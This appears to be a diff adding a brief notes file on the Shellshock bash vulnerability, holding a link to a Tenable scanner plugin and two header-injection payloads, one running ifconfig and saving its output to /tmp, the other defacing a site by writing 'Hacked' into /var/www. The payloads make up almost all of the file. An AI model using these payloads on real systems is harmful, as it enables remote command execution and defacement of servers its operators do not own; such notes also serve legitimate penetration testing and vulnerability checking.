@@ -1,0 +1,6 @@
+# shellshock
+
+http://www.tenable.com/plugins/index.php?view=single&id=77823
+
+x: () { :;}; /sbin/ifconfig > /tmp/ifconfig.txt
+x: () { :;}; echo "Hacked" > /var/www/hacked.html
